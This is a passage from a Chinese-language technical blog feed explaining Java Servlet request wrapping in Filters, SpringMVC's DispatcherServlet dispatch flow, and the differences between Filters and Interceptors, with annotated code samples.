        <span class="token class-name">ServletInputStream</span> servletIns <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isFinished</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
 
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isReady</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
 
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setReadListener</span><span class="token punctuation">(</span><span class="token class-name">ReadListener</span> readListener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 
            <span class="token punctuation">&#125;</span>
 
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> byteArrayIns<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span>  servletIns<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从上面我们也可以看出，Filter中使用的Request和Servlet中使用的Request是一致的，但我们可以在Filter中进行个掉包，Servlet获取到就这个掉包的request。完成数据的多次读取。</p>
<h3 id="请求图：-1"><a href="#请求图：-1" class="headerlink" title="请求图："></a>请求图：</h3><p><img src="../../typora-user-images/image-20230311175642823.png" alt="image-20230311175642823"></p>
<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><blockquote>
<p>Servlet 与 SpringMVC的关系？</p>
</blockquote>
<p>可以这么理解：Servlet是JDBC，强大但功能太过单一，而SpringMVC是Mybatis，是对JDBC的封装与扩展.</p>
<p>既然是对原先的Servlet进行增强，说明底层还是使用的Servlet，并进行了扩展与封装，这其实就是SpringMVC中的核心组件：<code>DispatcherServlet</code> 本质上还是一个Servlet。</p>
<blockquote>
<p>我们再来看看SpringMVC中是怎么进行处理的？  建议看杨傅超老师讲的SpringMVC的课程的最后部分</p>
</blockquote>
<p>既然DispatcherServlet仍然是一个Servlet，说明仍符合Servlet的生命周期，那最开始我们看的就是DispatcherServlet是如何<code>init()</code>？</p>
<p>其核心做了这几件事儿：</p>
<ol>
<li><p>创建WebApplicationContext</p>
<ol>
<li>通过反射创建 IOC 容器对象</li>
<li>设置父容器，也就是Spring容器与SpringMVC容器管理</li>
</ol>
</li>
<li><p>刷新WebApplicationContext</p>
<ol>
<li><p>调用了initStrategies(context)方法，初始化策略，即初始化DispatcherServlet的各个组件</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">initStrategies</span><span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 负责解析文件上传</span>
    <span class="token function">initMultipartResolver</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">initLocaleResolver</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">initThemeResolver</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 处理器映射器，通过请求信息找到对应的Handler，也就是我们写的Controller</span>
    <span class="token function">initHandlerMappings</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 处理器适配器，上面是负责找的，这个是负责执行的</span>
    <span class="token function">initHandlerAdapters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 处理全局异常</span>
    <span class="token function">initHandlerExceptionResolvers</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">initRequestToViewNameTranslator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">initViewResolvers</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">initFlashMapManager</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
</li>
<li><p> 将IOC容器在应用域共享</p>
</li>
</ol>
<p>那请求是如何处理的呢？ 我们知道在原来的Servlet中我们重新<code>doGet() doPost()</code> 方法来处理请求，所以我们着重看DispatchServlet是怎么处理这部分的。</p>
<p><code>FrameworkServlet</code>重写 HttpServlet中的service()和doXxx()，这些方法中调用了<code>processRequest(request, response)</code>, 不断的执行跳转后，最核心的处理就在：<code>org.springframework.web.servlet.DispatcherServlet.doDispatch()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doDispatch</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">HttpServletRequest</span> processedRequest <span class="token operator">=</span> request<span class="token punctuation">;</span>
    	<span class="token comment">// 这里就是拦截器执行链</span>
		<span class="token class-name">HandlerExecutionChain</span> mappedHandler <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
		<span class="token keyword">boolean</span> multipartRequestParsed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

		<span class="token class-name">WebAsyncManager</span> asyncManager <span class="token operator">=</span> <span class="token class-name">WebAsyncUtils</span><span class="token punctuation">.</span><span class="token function">getAsyncManager</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
             <span class="token comment">// 我们返回的模型视图</span>
			<span class="token class-name">ModelAndView</span> mv <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
			<span class="token class-name">Exception</span> dispatchException <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				processedRequest <span class="token operator">=</span> <span class="token function">checkMultipart</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
				multipartRequestParsed <span class="token operator">=</span> <span class="token punctuation">(</span>processedRequest <span class="token operator">!=</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">// 找到我们对应的Handler，也就是Controller</span>
				mappedHandler <span class="token operator">=</span> <span class="token function">getHandler</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>mappedHandler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token function">noHandlerFound</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">return</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>

				<span class="token comment">// 对于不同种类的请求使用不同的HandlerAdapter 就是我们上面初始化的处理器适配器，它是负责执行handler的</span>
				<span class="token class-name">HandlerAdapter</span> ha <span class="token operator">=</span> <span class="token function">getHandlerAdapter</span><span class="token punctuation">(</span>mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">// Process last-modified header, if supported by the handler.</span>
				<span class="token class-name">String</span> method <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">boolean</span> isGet <span class="token operator">=</span> <span class="token class-name">HttpMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>isGet <span class="token operator">||</span> <span class="token class-name">HttpMethod</span><span class="token punctuation">.</span><span class="token constant">HEAD</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">long</span> lastModified <span class="token operator">=</span> ha<span class="token punctuation">.</span><span class="token function">getLastModified</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletWebRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkNotModified</span><span class="token punctuation">(</span>lastModified<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isGet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
						<span class="token keyword">return</span><span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span>
				<span class="token comment">// 执行拦截器的preHandle方法</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mappedHandler<span class="token punctuation">.</span><span class="token function">applyPreHandle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">return</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>

				<span class="token comment">// 这里就是实际执行我们Controller的位置</span>
				mv <span class="token operator">=</span> ha<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span>asyncManager<span class="token punctuation">.</span><span class="token function">isConcurrentHandlingStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">return</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>

				<span class="token function">applyDefaultViewName</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token comment">// 这里就是执行拦截器 postHandle() 方法</span>
				mappedHandler<span class="token punctuation">.</span><span class="token function">applyPostHandle</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				dispatchException <span class="token operator">=</span> ex<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token comment">// As of 4.3, we're processing Errors thrown from handler methods as well,</span>
				<span class="token comment">// making them available for @ExceptionHandler methods and other scenarios.</span>
				dispatchException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NestedServletException</span><span class="token punctuation">(</span><span class="token string">"Handler dispatch failed"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
             <span class="token comment">// 处理我们返回的结果</span>
			<span class="token function">processDispatchResult</span><span class="token punctuation">(</span>processedRequest<span class="token punctuation">,</span> response<span class="token punctuation">,</span> mappedHandler<span class="token punctuation">,</span> mv<span class="token punctuation">,</span> dispatchException<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最终执行：<code>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">processDispatchResult</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span>
			<span class="token annotation punctuation">@Nullable</span> <span class="token class-name">HandlerExecutionChain</span> mappedHandler<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">ModelAndView</span> mv<span class="token punctuation">,</span>
			<span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Exception</span> exception<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
		
		<span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token keyword">instanceof</span> <span class="token class-name">ModelAndViewDefiningException</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"ModelAndViewDefiningException encountered"</span><span class="token punctuation">,</span> exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
				mv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ModelAndViewDefiningException</span><span class="token punctuation">)</span> exception<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getModelAndView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				<span class="token class-name">Object</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span>mappedHandler <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> mappedHandler<span class="token punctuation">.</span><span class="token function">getHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token comment">// 全局异常控制</span>
				mv <span class="token operator">=</span> <span class="token function">processHandlerException</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> handler<span class="token punctuation">,</span> exception<span class="token punctuation">)</span><span class="token punctuation">;</span>
				errorView <span class="token operator">=</span> <span class="token punctuation">(</span>mv <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Did the handler return a view to render?</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>mv <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>mv<span class="token punctuation">.</span><span class="token function">wasCleared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
             <span class="token comment">// 处理模型数据和渲染视图</span>
			<span class="token function">render</span><span class="token punctuation">(</span>mv<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>errorView<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">clearErrorRequestAttributes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		
		<span class="token keyword">if</span> <span class="token punctuation">(</span>mappedHandler <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment">// 调用拦截器的afterCompletion()</span>
			mappedHandler<span class="token punctuation">.</span><span class="token function">triggerAfterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Interceptor"><a href="#Interceptor" class="headerlink" title="Interceptor"></a>Interceptor</h2><blockquote>
<p>为什么还需要拦截器呢？</p>
</blockquote>
<ol>
<li>拦截器是Spring的一部分，可以直接使用IOC与AOP，而过滤器是Servlet规范中的一部分，无法使用Spring的便利</li>
<li>拦截器可以访问SpringMVC中的Controller和ModelAndView，并可以进行处理，而过滤器只能处理最原始的数据。</li>
</ol>
<p>可以这么想，拦截器的粒度要更精细，更可控并且扩展性更高。</p>
<blockquote>
<p>Interceptor是在哪里发生作用？</p>
</blockquote>
<p>​        上面的代码就能很清晰的看到 Interceptor 在 <code>doDispatch</code>中，在执行Handler之前执行。</p>
<blockquote>
<p>Interceptor能否像Filter一样，对request进行偷天幻日？</p>
</blockquote>
<p>​        不行，因为在Interceptor中对request进行包装，并不会传递出去。后面使用的仍然是原先的request。</p>
<h3 id="请求图：-2"><a href="#请求图：-2" class="headerlink" title="请求图："></a>请求图：</h3><img src="../../typora-user-images/image-20230311180116872.png" alt="image-20230311180116872" style="zoom:80%;" />

]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
        <tag>SpringMVC</tag>
      </tags>
  </entry>
  <entry>
    <title>拦截器与过滤器的区别</title>
    <url>//post/Web/%E6%8B%A6%E6%88%AA%E5%99%A8%E4%B8%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB.html</url>
    <content><![CDATA[<h1 id="拦截器与过滤器的区别"><a href="#拦截器与过滤器的区别" class="headerlink" title="拦截器与过滤器的区别"></a>拦截器与过滤器的区别</h1><blockquote>
<p> 底层思想是什么？</p>
</blockquote>
<p>拦截器与过滤器都是基于AOP面向切面编程的思想来实现的。</p>
<blockquote>
<p>两者有什么相同，有什么不同？</p>
</blockquote>
<p>相同点：都可以对请求做出统一的处理，例如在方法调用前进行一些操作，在方法调后后处理一些操作</p>
<p>不同点：</p>
<ol>
<li>拦截器是Spring提供的（<code>org.springframework.web.servlet.HandlerInterceptor</code>），而过滤器是Servlet提供的（<code>java.servlet.*</code>）</li>
<li>触发时机不同，过滤器在请求到达Servlet前被拦截开始执行，拦截器在到达Controller前被拦截开始执行</li>
<li>实现不同，过滤器<strong>基于方法回调实现</strong>，而拦截器是<strong>基于动态代理（底层反射）实现</strong></li>
<li>支持的项目不同，过滤器只能在Web项目中用，拦截器可以在Swing，Application中都能用</li>
<li>使用场景不同，因为拦截器更接近业务系统，所以<strong>拦截器主要用来实现项目中的业务判断的</strong>，比如：登录判断、权限判断、日志记录等业务。而<strong>过滤器通常是用来实现通用功能过滤的</strong>，比如：敏感词过滤、字符集编码设置、响应数据压缩等功能。</li>
</ol>
<blockquote>
<p> 为什么使用他们？</p>
</blockquote>
<p>​    在我们的日常业务中，我们总有一些通用但又不涉及核心业务的需求，比如日志管理，权限管理，敏感信息排查等，如何将这部分内容抽取出来，而不侵入核心代码，并可以做到灵活的扩展。就可以使用拦截器或者过滤器，但他们应用场景是不同的。</p>
<h3 id="FIlter"><a href="#FIlter" class="headerlink" title="FIlter"></a>FIlter</h3><blockquote>
<p>如何进行使用？</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span>
<span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/*"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> filter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"过滤器：执行 init 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Filter</span><span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"过滤器：开始执行 doFilter 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 请求放行</span>
        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"过滤器：结束执行 doFilter 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"过滤器：执行 destroy 方法。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>生命周期是怎么样的？</p>
</blockquote>
<p>Filter有三个需要实现的方法：<code>init,doFilter,destroy</code></p>
<p>​    当Web服务启动时，就会调用 init 方法，</p>
<p>​    当请求进入时，在进入Controller之前就会被 doFilter 拦截到，然后判断是否后面还有拦截器，如果没有了，则执行业务方法，执行完业务方法，返回后，会回到 doFilter方法，再进行其他操作。<strong>这里需要注意</strong>：当最后一个Filter的 <code>filterChain.doFilter(servletRequest, servletResponse);</code> 被调用完后，数据已经被渲染到页面了，然后才操作的下面的处理。</p>
<p>​    Web服务结束时，<code>destroy()</code> 被调用。</p>
<blockquote>
<p>如何控制Filter的拦截顺序，以及doFilter() 方法先后是如何执行的？</p>
</blockquote>
<p>方法1：在web.xml中控制filter-mapping的位置来控制的，放在上面的会比放在下面的先执行，如下“用户登录检查过滤器”会比“接口日志过滤器”先执行</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 用户登录检测过滤器 --></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
	 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>UserLoginFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
		 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>net.tfgzs.demo.filter.UserLoginFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
		 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>UserLoginFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
		 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
	<span class="token comment">&lt;!--接口日志过滤器--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ApiLog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>net.tfgzs.demo.filter.ApiLog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ApiLog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法2：在@WebFilter中并未找到排序的方法，可以通过Filter的文件名来控制，比如：</p>
<ol>
<li>在同一个包下，aFilter &gt; bFilter</li>
<li>在不同包下，a/a.Filter &gt; a/b.Filter &gt; b/a.Filter</li>
</ol>
